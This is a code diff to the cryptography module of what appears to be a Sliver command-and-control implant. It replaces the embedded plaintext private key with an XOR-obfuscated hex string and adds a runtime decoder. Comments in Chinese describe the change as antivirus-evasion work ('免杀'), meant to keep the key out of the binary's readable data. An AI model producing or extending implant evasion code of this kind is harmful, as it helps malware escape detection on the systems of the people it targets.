@@ -21,7 +21,10 @@ package cryptography
 import (
 	"crypto/hmac"
 	"crypto/sha256"
+	"encoding/hex"
 	"errors"
+	"strings"
+	"sync"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -31,8 +34,15 @@ import (
 var (
 	// PeerAgePublicKey - The implant's age public key
 	PeerAgePublicKey = "{{.Build.PeerPublicKey}}"
-	// peerPrivateKey - The implant's age private key
-	peerAgePrivateKey = "{{.Build.PeerPrivateKey}}"
+	// peerAgePrivateKeyObfuscated - The implant's age private key, obfuscated
+	// 免杀 R-1.2：注入「hex(密文):hex(pad)」（每次构建随机 pad，server 侧 crypto/rand），
+	// rodata 不含私钥明文；运行时经 peerPrivateKey() 懒解码一次后驻留堆（驻留边界见 R-1a/R-1.3）。
+	peerAgePrivateKeyObfuscated = "{{ObfuscateHexPair .Build.PeerPrivateKey}}"
+	// peerKeyOverride Debug 构建的 SetSecrets 覆盖通道
+	peerKeyOverride string
+	peerKeyMu       sync.Mutex
+	peerKeyDecoded  string
+	peerKeyReady    bool
 	// PublicKeySignature - The implant's age public key minisigned'd
 	PeerAgePublicKeySignature = `{{.Build.PeerPublicKeySignature}}`
 	// serverPublicKey - Server's ECC public key
@@ -47,7 +57,11 @@ var (
 // {{if .Config.Debug}} - Used for unit tests, remove from normal builds where these values are set at compile-time
 func SetSecrets(peerPublicKey, peerPrivateKey, peerPublicKeySignature, serverPublicKey, minisignServerPublicKey string) {
 	PeerAgePublicKey = peerPublicKey
-	peerAgePrivateKey = peerPrivateKey
+	peerKeyOverride = peerPrivateKey
+	peerKeyMu.Lock()
+	peerKeyDecoded = peerPrivateKey
+	peerKeyReady = true
+	peerKeyMu.Unlock()
 	PeerAgePublicKeySignature = peerPublicKeySignature
 	serverAgePublicKey = serverPublicKey
 	serverMinisignPublicKey = minisignServerPublicKey
@@ -55,11 +69,38 @@ func SetSecrets(peerPublicKey, peerPrivateKey, peerPublicKeySignature, serverPub
 
 // {{end}}
 
+// peerPrivateKey 返回解码后的 age 私钥（免杀 R-1.2：懒解码一次后驻留堆）。
+// Obfuscated 注入串格式「hex(密文):hex(pad)」，逐字节异或还原；
+// 无分隔符/解码失败时按明文注入兼容处理（降级路径，正常构建不触发）。
+func peerPrivateKey() string {
+	peerKeyMu.Lock()
+	defer peerKeyMu.Unlock()
+	if peerKeyReady {
+		return peerKeyDecoded
+	}
+	parts := strings.SplitN(peerAgePrivateKeyObfuscated, ":", 2)
+	decoded := peerAgePrivateKeyObfuscated
+	if len(parts) == 2 {
+		cipher, errCipher := hex.DecodeString(parts[0])
+		pad, errPad := hex.DecodeString(parts[1])
+		if errCipher == nil && errPad == nil && len(cipher) == len(pad) {
+			raw := make([]byte, len(cipher))
+			for i := range cipher {
+				raw[i] = cipher[i] ^ pad[i]
+			}
+			decoded = string(raw)
+		}
+	}
+	peerKeyDecoded = decoded
+	peerKeyReady = true
+	return decoded
+}
+
 // GetPeerAgeKeyPair - Get the implant's key pair
 func GetPeerAgeKeyPair() *AgeKeyPair {
 	return &AgeKeyPair{
 		Public:  PeerAgePublicKey,
-		Private: peerAgePrivateKey,
+		Private: peerPrivateKey(),
 	}
 }
 
